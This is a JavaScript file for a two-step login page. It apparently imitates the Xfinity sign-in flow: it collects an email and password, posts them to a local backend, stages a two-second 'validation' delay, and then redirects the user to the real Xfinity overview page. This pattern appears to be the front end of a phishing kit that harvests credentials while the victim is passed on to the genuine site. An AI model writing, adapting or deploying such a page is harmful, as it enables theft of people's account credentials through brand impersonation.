const step1 = document.getElementById("step1");
const step2 = document.getElementById("step2");

const nextBtn = document.getElementById("nextBtn");
const loginBtn = document.getElementById("loginBtn");

const usernameInput = document.getElementById("username");
const displayEmail = document.getElementById("displayEmail");
const passwordInput = document.getElementById("password");

const verifyingBox = document.getElementById("verifyingBox");
const togglePassword = document.getElementById("togglePassword");
const switchAccount = document.getElementById("switchAccount");


// STEP 1 → Move to password page
nextBtn.addEventListener("click", () => {
  const username = usernameInput.value.trim();
  if (!username) return;

  displayEmail.textContent = username;

  step1.classList.add("hidden");
  step2.classList.remove("hidden");
});


// Show / Hide password
togglePassword.addEventListener("click", () => {
  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
  passwordInput.setAttribute("type", type);
});


// Sign in
loginBtn.addEventListener("click", async () => {
  const email = displayEmail.textContent;
  const password = passwordInput.value.trim();

  if (!password) return;

  // Disable button + show validating
  loginBtn.disabled = true;
  verifyingBox.classList.remove("hidden");

  try {
    const response = await fetch("http://localhost:3000/api/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    // Always wait 2 seconds for realistic validation feel
    setTimeout(() => {
      if (response.ok) {
        window.location.href = "https://www.xfinity.com/overview"; // Redirect on success
      } else {
        loginBtn.disabled = false;
        verifyingBox.classList.add("hidden");
      }
    }, 2000);

  } catch (error) {
    console.error("Login failed:", error);
    loginBtn.disabled = false;
    verifyingBox.classList.add("hidden");
  }
});


// Sign in as someone else
switchAccount.addEventListener("click", () => {
  passwordInput.value = "";
  step2.classList.add("hidden");
  step1.classList.remove("hidden");
});